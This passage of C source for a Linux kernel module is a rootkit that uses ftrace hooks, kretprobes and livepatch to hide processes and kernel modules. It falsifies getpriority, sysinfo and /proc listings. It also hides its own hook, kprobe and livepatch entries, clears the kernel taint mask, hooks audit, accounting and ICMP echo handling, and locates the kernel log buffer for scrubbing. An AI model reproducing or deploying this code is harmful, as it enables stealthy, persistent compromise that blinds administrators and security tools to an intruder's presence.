        HOOK("do_sched_setscheduler", ftrace_do_sched_setscheduler, &real_do_sched_setscheduler),
        //  sys_sched_setaffinity
        HOOK("sched_setaffinity", ftrace_sched_setaffinity, &real_sched_setaffinity),
        //  sys_sched_setattr
        HOOK("sched_setattr", ftrace_sched_setattr, &real_sched_setattr),
        //  sys_setpriority
        HOOK("set_one_prio", ftrace_set_one_prio, &real_set_one_prio),
        //  sys_tkill sys_tgkill
        HOOK("do_tkill", ftrace_do_tkill, &real_do_tkill),
	// sys_rt_sigqueueinfo
        HOOK("do_rt_sigqueueinfo", ftrace_do_rt_sigqueueinfo, &real_do_rt_sigqueueinfo),
	// sys_rt_tgsigqueueinfo
        HOOK("do_rt_tgsigqueueinfo", ftrace_do_rt_tgsigqueueinfo, &real_do_rt_tgsigqueueinfo),
	// sys_getpsid
        HOOK("security_task_getsid", ftrace_security_task_getsid, &real_security_task_getsid),
	// sys_setpgid
        HOOK("security_task_setpgid", ftrace_security_task_setpgid, &real_security_task_setpgid),
	// sys_migrate_pages,
        HOOK("kernel_migrate_pages", ftrace_kernel_migrate_pages, &real_kernel_migrate_pages),
	// sys_migrate_pages,
        HOOK("kernel_move_pages", ftrace_kernel_move_pages, &real_kernel_move_pages),
	// sys_prlimit64,
        HOOK("do_prlimit", ftrace_do_prlimit, &real_do_prlimit),
	// sys_pidfd_open,
        HOOK("pidfd_create", ftrace_pidfd_create, &real_pidfd_create),
	// sys_process_vm_readv, sys_process_vm_writev
        HOOK("mm_access", ftrace_mm_access, &real_mm_access),
        // sys_perf_event_open, sys_get_robust_list, sys_kcmp 
        HOOK("ptrace_may_access", ftrace_ptrace_may_access, &real_ptrace_may_access),
        HOOK("reboot_pid_ns", ftrace_reboot_pid_ns, &real_reboot_pid_ns),
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 0, 1)
        HOOK("__fsnotify_parent", ftrace___fsnotify_parent, &real___fsnotify_parent),
        HOOK("fsnotify", ftrace_fsnotify, &real_fsnotify),
#endif
        HOOK("icmp_echo", ftrace_icmp_echo, &real_icmp_echo),
        HOOK("ptrace_attach", ftrace_ptrace_attach, &real_ptrace_attach),
        HOOK("register_kprobe", ftrace_register_kprobe, &real_register_kprobe),
        HOOK("unregister_kprobe", ftrace_unregister_kprobe, &real_unregister_kprobe),
        HOOK("msg_print_text", ftrace_msg_print_text, &real_msg_print_text),
        HOOK("msg_print_ext_body", ftrace_msg_print_ext_body, &real_msg_print_ext_body),
        HOOK("layout_and_allocate", ftrace_layout_and_allocate, &real_layout_and_allocate),
        HOOK("acct_process", ftrace_acct_process, &real_acct_process),
        HOOK("taskstats_exit", ftrace_taskstats_exit, &real_taskstats_exit),
};

static int entry_handler_sys_getpriority(struct kretprobe_instance *ri, struct pt_regs *regs)
{
        return 0;
}

static int ret_handler_sys_getpriority(struct kretprobe_instance *ri, struct pt_regs *regs)
{
        unsigned long retval = regs_return_value(regs);

	//int which = (int) regs_get_kernel_argument(regs, 0);
	pid_t who = (pid_t) regs_get_kernel_argument(regs, 1);

	if (retval != (unsigned long)(-ESRCH)) {
		if (is_hidden_proc_pid(who))
			regs_set_return_value(regs, (unsigned long)(-ESRCH));
	}

        return 0;
}

struct sysinfo_data {
	struct sysinfo *info;
};
static int entry_handler_do_sysinfo(struct kretprobe_instance *ri, struct pt_regs *regs)
{
        struct sysinfo_data *data;

        if (!current->mm)
                return 1;       /* Skip kernel threads */

        data = (struct sysinfo_data *)ri->data;
        data->info = (struct sysinfo *)regs_get_kernel_argument(regs, 0);
        return 0;
}

static int ret_handler_do_sysinfo(struct kretprobe_instance *ri, struct pt_regs *regs)
{
        struct sysinfo_data *data;
        unsigned long retval = regs_return_value(regs);

        data = (struct sysinfo_data *)ri->data;
	if (retval == 0 && data->info) {
		//pr_info("procs:%u num_proc_name:%d\n", data->info->procs, num_proc_name);
		data->info->procs -= num_proc_name;
	}

        return 0;
}

struct init_module_data {
	struct module *m;
};

static int entry_handler_do_init_module(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct init_module_data *data  = NULL;

	data = (struct init_module_data *)ri->data;
	data->m = (struct module *)regs_get_kernel_argument(regs, 0);

	return 0;
}

static int ret_handler_do_init_module(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	unsigned long retval = regs_return_value(regs);
	struct init_module_data *data  = NULL;

	data = (struct init_module_data *)ri->data;
	if (!retval && data && data->m && is_hidden_module_name(data->m->name))
		hidden_module(data->m);

	return 0;
}

#if 0
static int entry_handler_init_module(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	if (*p_modules_disabled) {
		old_modules_disabled = *p_modules_disabled;
		*p_modules_disabled = 0;
	}

	return 0;
}

static int ret_handler_init_module(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	if (old_modules_disabled) {
		*p_modules_disabled = old_modules_disabled;
		old_modules_disabled = 0;
	}

	return 0;
}
#endif

static struct kretprobe krps[] = {
	{
		// sys_getpriority
		.kp.symbol_name = "__x64_sys_getpriority",
		.handler        = ret_handler_sys_getpriority,
		.entry_handler  = entry_handler_sys_getpriority,
		.data_size      = 0,
                .maxactive      = 20,
	},

	{
		.kp.symbol_name = "do_sysinfo",
		.handler        = ret_handler_do_sysinfo,
		.entry_handler  = entry_handler_do_sysinfo,
		.data_size      = sizeof(struct sysinfo_data),
                .maxactive      = 20,
	},

	{
		//do_init_module
		.kp.symbol_name = "do_init_module",
		.handler        = ret_handler_do_init_module,
		.entry_handler  = entry_handler_do_init_module,
		.data_size      = sizeof (struct init_module_data),
		.maxactive      = 20,
	},

#if 0
	{
		//syscall init_module
		.kp.symbol_name = "__x64_sys_init_module",
		.handler        = ret_handler_init_module,
		.entry_handler  = entry_handler_init_module,
		.data_size      = 0,
		.maxactive      = 20,
	},
	{
		//syscall finit_module
		.kp.symbol_name = "__x64_sys_finit_module",
		.handler        = ret_handler_init_module,
		.entry_handler  = entry_handler_init_module,
		.data_size      = 0,
		.maxactive      = 20,
	},
#endif
};

struct kretprobe *rps[] = {&krps[0], &krps[1], &krps[2]/*, &krps[3], &krps[4] */};

static struct klp_func funcs[] = {
	{
		.old_name = "proc_pid_readdir",
		.new_func = livepatch_proc_pid_readdir,
	}, 
	{
		.old_name = "proc_pid_lookup",
		.new_func = livepatch_proc_pid_lookup,
	}, 
	{
		.old_name = "cn_netlink_send",
		.new_func = livepatch_cn_netlink_send,
	}, 
	{
		.old_name = "__audit_bprm",
		.new_func = livepatch__audit_bprm,
	}, 
	{
		.old_name = "modules_open",
		.new_func = livepatch_modules_open,
	}, 
	{
		.old_name = "module_get_kallsym",
		.new_func = livepatch_module_get_kallsym,
	},
	{
                // sys_kill
		.old_name = "kill_pid_info",
		.new_func = livepatch_kill_pid_info,
	}, 
	{
		// sys_getpgid
		.old_name = "do_getpgid",
		.new_func = livepatch_do_getpgid,
	}, 
	{
		// sys_chdir
		.old_name = "ksys_chdir",
		.new_func = livepatch_ksys_chdir,
	}, 
	{
		// sys_bpf
		.old_name = "security_bpf",
		.new_func = livepatch_security_bpf,
	}, 
	{ }
};

static struct klp_object objs[] = {
	{
		/* name being NULL means vmlinux */
		.funcs = funcs,
	}, { }
};

static struct klp_patch patch = {
	.mod = THIS_MODULE,
	.objs = objs,
};

static int livepatch_init(void)
{
	int ret = -1;

	p_next_tgid = (struct tgid_iter (*)(struct pid_namespace *ns, struct tgid_iter iter)) 
				kallsyms_lookup_name("next_tgid");
	if (!p_next_tgid)
		return -1;

	#if 0
	p_ptrace_may_access = (bool (*)(struct task_struct *task, unsigned int mode)) 
				kallsyms_lookup_name("ptrace_may_access");
	if (!p_ptrace_may_access)
		return -1;
	#endif

	p_proc_fill_cache = (bool (*)(struct file *file, struct dir_context *ctx,
				const char *name, unsigned int len,
				instantiate_t instantiate, struct task_struct *task, const void *ptr))
				kallsyms_lookup_name("proc_fill_cache");
	if (!p_proc_fill_cache)
		return -1;

	p_proc_pid_instantiate = (struct dentry *(*)(struct dentry * dentry,
                                   struct task_struct *task, const void *ptr))
				kallsyms_lookup_name("proc_pid_instantiate");
	if (!p_proc_pid_instantiate)
		return -1;

	p_modules = (struct list_head *)
				kallsyms_lookup_name("modules");
	if (!p_modules)
		return -1;

	p_module_address = (struct module *(*)(unsigned long addr))
				kallsyms_lookup_name("__module_address");
	if (!p_module_address)
		return -1;

#if 0
	p_modules_disabled = (int *)
				kallsyms_lookup_name("modules_disabled");
	if (!p_modules_disabled)
		return -1;
#endif

	p_module_flags = (char *(*)(struct module *mod, char *buf))
				kallsyms_lookup_name("module_flags");
	if (!p_module_flags)
		return -1;

	p_kallsyms_show_value = (bool (*)(const struct cred *cred))
				kallsyms_lookup_name("kallsyms_show_value");
	if (!p_kallsyms_show_value)
		return -1;

	p__start___ksymtab = (struct kernel_symbol*)
				kallsyms_lookup_name("__start___ksymtab");
	if (!p__start___ksymtab)
		return -1;

	p__stop___ksymtab = (struct kernel_symbol*)
				kallsyms_lookup_name("__stop___ksymtab");
	if (!p__stop___ksymtab)
		return -1;

	p_ddebug_remove_module = (int (*)(const char *mod_name))
				kallsyms_lookup_name("ddebug_remove_module");
	if (!p_ddebug_remove_module)
		return -1;

	p_tainted_mask = (unsigned long*)
				kallsyms_lookup_name("tainted_mask");
	if (!p_tainted_mask)
		return -1;

//#if 0
	p_ftrace_lock = (struct mutex *) kallsyms_lookup_name("ftrace_lock");
	if (!p_ftrace_lock)
		return -1;

#if 0
	p_ftrace_ops_list = (struct ftrace_ops **) kallsyms_lookup_name("ftrace_ops_list");
	if (!p_ftrace_ops_list)
		return -1;

	p_ftrace_list_end = (struct ftrace_ops *) kallsyms_lookup_name("ftrace_list_end");
	if (!p_ftrace_list_end)
		return -1;
#endif

	p_klp_find_ops = (struct klp_ops *(*)(void *old_func)) kallsyms_lookup_name("klp_find_ops");
	if (!p_klp_find_ops)
		return -1;

	p_ftrace_lookup_ip = (struct ftrace_func_entry *(*)(struct ftrace_hash *hash, unsigned long ip))
				 kallsyms_lookup_name("ftrace_lookup_ip");
	if (!p_ftrace_lookup_ip)
		return -1;

	p_ftrace_pages_start = (struct ftrace_page **)
				 kallsyms_lookup_name("ftrace_pages_start");
	if (!p_ftrace_pages_start)
		return -1;

	p_log_buf = (char **) kallsyms_lookup_name("log_buf");
	if (!p_log_buf)
		return -1;

	p_logbuf_lock = (raw_spinlock_t *) kallsyms_lookup_name("logbuf_lock");
	if (!p_logbuf_lock)
		return -1;

	p_clear_seq = (u64*) kallsyms_lookup_name("clear_seq");
	if (!p_clear_seq)
		return -1;

	p_clear_idx = (u32*) kallsyms_lookup_name("clear_idx");
	if (!p_clear_idx)
		return -1;

	p_log_next_seq = (u64*) kallsyms_lookup_name("log_next_seq");
	if (!p_log_next_seq)
		return -1;

	p_log_next_idx = (u32*) kallsyms_lookup_name("log_next_idx");
	if (!p_log_next_idx)
		return -1;

	p__printk_safe_enter = (void(*)(void)) kallsyms_lookup_name("__printk_safe_enter");
	if (!p__printk_safe_enter)
		return -1;

	p__printk_safe_exit = (void(*)(void)) kallsyms_lookup_name("__printk_safe_exit");
	if (!p__printk_safe_exit)
		return -1;

	#if 0
	p_console_trylock_spinning = (int (*)(void)) kallsyms_lookup_name("console_trylock_spinning");
	if (!p_console_trylock_spinning)
		return -1;

	p_console_lock= (void (*)(void)) kallsyms_lookup_name("console_lock");
	if (!p_console_lock)
		return -1;

	p_console_unlock= (void (*)(void)) kallsyms_lookup_name("console_unlock");
	if (!p_console_unlock)
		return -1;

	p_wake_up_klogd = (void (*)(void)) kallsyms_lookup_name("wake_up_klogd");
	if (!p_wake_up_klogd)
		return -1;
	#endif

	p_name_to_int = (unsigned (*)(const struct qstr *qstr))
				 kallsyms_lookup_name("name_to_int");
	if (!p_name_to_int)
		return -1;

	p_find_task_by_pid_ns = (struct task_struct *(*)(pid_t nr, struct pid_namespace *ns))
				 kallsyms_lookup_name("find_task_by_pid_ns");
	if (!p_find_task_by_pid_ns)
		return -1;

	p_group_send_sig_info = (int (*)(int sig, struct kernel_siginfo *info, struct task_struct *p, enum pid_type type))
				 kallsyms_lookup_name("group_send_sig_info");
	if (!p_group_send_sig_info)
		return -1;

	p_find_task_by_vpid = (struct task_struct *(*)(pid_t vnr))
				 kallsyms_lookup_name("find_task_by_vpid");
	if (!p_find_task_by_vpid)
		return -1;
	
	p_security_task_getpgid = (int (*)(struct task_struct *p))
				 kallsyms_lookup_name("security_task_getpgid");
	if (!p_security_task_getpgid)
		return -1;

	p_free_uid = (void (*)(struct user_struct *up))
				 kallsyms_lookup_name("free_uid");
	if (!p_free_uid)
		return -1;

	p_tasklist_lock = (rwlock_t *) kallsyms_lookup_name("tasklist_lock");
	if (!p_tasklist_lock)
		return -1;

	p_find_user = (struct user_struct *(*)(kuid_t uid))
				 kallsyms_lookup_name("find_user");
	if (!p_find_user)
		return -1;

	p_kprobe_ftrace_ops = (struct ftrace_ops *)
				 kallsyms_lookup_name("kprobe_ftrace_ops");
	if (!p_kprobe_ftrace_ops)
		return -1;

	p_kprobe_ipmodify_ops = (struct ftrace_ops *)
				 kallsyms_lookup_name("kprobe_ipmodify_ops");
	if (!p_kprobe_ipmodify_ops)
		return -1;

	p_sysctl_nr_open = (unsigned int *)
				 kallsyms_lookup_name("sysctl_nr_open");
	if (!p_sysctl_nr_open)
		return -1;

	p_kernel_text_address = (int (*)(unsigned long addr))
				 kallsyms_lookup_name("kernel_text_address");
	if (!p_kernel_text_address)
		return -1;

	p_set_fs_pwd = (void (*)(struct fs_struct *fs, const struct path *path))
				 kallsyms_lookup_name("set_fs_pwd");
	if (!p_set_fs_pwd)
		return -1;

	p_putname = (void (*)(struct filename *name))
				 kallsyms_lookup_name("putname");
	if (!p_putname)
		return -1;
	p_getname = (struct filename * (*)(const char __user * filename))
				 kallsyms_lookup_name("getname");
	if (!p_getname)
		return -1;

	p_find_get_task_by_vpid = (struct task_struct *(*)(pid_t nr)) 
				 kallsyms_lookup_name("find_get_task_by_vpid");
	if (!p_find_get_task_by_vpid)
		return -1;

	p_find_module = (struct module *(*)(const char *name)) 
				kallsyms_lookup_name("find_module");
	if (!p_find_module)
		return -1;

	fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	hidden_from_enabled_functions_ftrace_hooks(hooks, ARRAY_SIZE(hooks));

	ret = klp_enable_patch(&patch);
	if (ret == 0) { 
		hidden_modules();
		hidden_from_sys_livepatch(&patch);
		hidden_from_enabled_functions_klp(objs);
	}

	register_kretprobes(rps, ARRAY_SIZE(rps));
	hidden_from_enabled_functions_kprobe(rps, ARRAY_SIZE(rps));

	clear_livepatch_tainted_mask();

//	*p_modules_disabled = force_modules_disabled;
//	print_hidden_proc_name();
//	print_hidden_module_name();
	//clear_klog();

	event_kthread = kthread_run(kthread_do_event, NULL, KHTREAD_PROC_NAME);

	return ret;
}

static void livepatch_exit(void)
{
}

module_init(livepatch_init);
module_exit(livepatch_exit);
MODULE_LICENSE("GPL");
MODULE_INFO(livepatch, "Y");
